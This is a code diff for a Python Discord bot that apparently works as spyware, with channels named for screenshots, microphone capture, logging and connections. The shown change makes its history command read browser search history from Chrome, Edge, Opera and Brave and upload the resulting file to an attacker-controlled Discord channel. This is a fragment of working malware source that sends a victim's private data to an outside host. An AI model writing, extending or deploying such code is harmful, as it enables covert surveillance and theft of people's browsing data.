@@ -13,6 +13,7 @@ guild_id = "1198070162432200865"
 screenshot_channel = "1209205802032955413"
 microphone_channel = "1209237919592615937"
 logger_channel = "1215387927023063040"
+commands_channel = "1221429436738441336"
 connect_channel = "1209247219874668638"
 
 searchhistory = SearchHistory()
@@ -71,15 +72,20 @@ async def get_history(interaction: discord.Interaction, browser: str, days: int)
         browsers = ["chrome", "google", "edge", "opera", "opera gx", "brave", "microsoft edge"]
         if browser.lower() in browsers:
             if browser.lower() == "chrome" or browser.lower() == "google":
-                result = searchhistory.get_chrome()
+                result, browser = searchhistory.get_chrome()
             if browser.lower() == "edge" or browser.lower() == "microsoft edge":
-                result = searchhistory.get_edge()
+                result, browser = searchhistory.get_edge()
             if browser.lower() == "opera" or browser.lower() == "opera gx":
-                result = searchhistory.get_opera()
+                result, browser = searchhistory.get_opera()
             if browser.lower() == "brave":
-                result = searchhistory.get_brave()
+                result, browser = searchhistory.get_brave()
 
-            await interaction.response.send_message(result)
+            guild = await bot.fetch_guild(guild_id)
+            channel = await guild.fetch_channel(commands_channel)
+
+            with open(browser, 'rb') as screenshot_file:
+                await channel.send(file=discord.File(screenshot_file, browser))
+
         if browser.lower() == "all":
             result = searchhistory.get_all()
             await interaction.response.send_message(result)
